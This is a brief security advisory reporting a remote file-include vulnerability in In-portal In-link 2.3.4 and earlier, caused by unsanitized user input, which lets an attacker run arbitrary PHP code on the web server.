In-portal In-link is prone to a remote file-include vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.

In-link 2.3.4 and earlier versions are affected by this issue.
